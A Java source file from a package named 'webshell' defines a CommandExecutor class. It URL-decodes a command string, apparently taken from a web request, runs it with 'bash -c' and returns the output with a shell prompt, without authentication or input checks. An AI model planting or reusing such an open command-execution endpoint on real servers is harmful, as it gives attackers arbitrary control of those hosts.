package com.codeboy.dshell.webshell;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.io.Writer;
import java.net.URLDecoder;

public class CommandExecutor {

	public static String executeCommand(String command, boolean waitForResponse) throws UnsupportedEncodingException {

		String response = "";
		command = URLDecoder.decode(command,"UTF-8") ;
		ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
		pb.redirectErrorStream(true);

		System.out.println("Linux command: " + command);

		try {
			Process shell = pb.start();

			if (waitForResponse) {

				// To capture output from the shell
				InputStream shellIn = shell.getInputStream();

				// Wait for the shell to finish and get the return code
				int shellExitStatus = shell.waitFor();
				System.out.println("Exit status" + shellExitStatus);

				response = convertStreamToStr(shellIn);

				shellIn.close();
			}

		}

		catch (IOException e) {
			System.out
					.println("Error occured while executing Linux command. Error Description: "
							+ e.getMessage());
		}

		catch (InterruptedException e) {
			System.out
					.println("Error occured while executing Linux command. Error Description: "
							+ e.getMessage());
		}

		return response+"\n" +AMMainPageHandler.getBashPrompt();
	}

	/*
	 * To convert the InputStream to String we use the Reader.read(char[]
	 * buffer) method. We iterate until the Reader return -1 which means there's
	 * no more data to read. We use the StringWriter class to produce the
	 * string.
	 */

	public static String convertStreamToStr(InputStream is) throws IOException {

		if (is != null) {
			Writer writer = new StringWriter();

			char[] buffer = new char[1024];
			try {
				Reader reader = new BufferedReader(new InputStreamReader(is,
						"UTF-8"));
				int n;
				while ((n = reader.read(buffer)) != -1) {
					writer.write(buffer, 0, n);
				}
			} finally {
				is.close();
			}
			return writer.toString();
		} else {
			return "";
		}
	}

}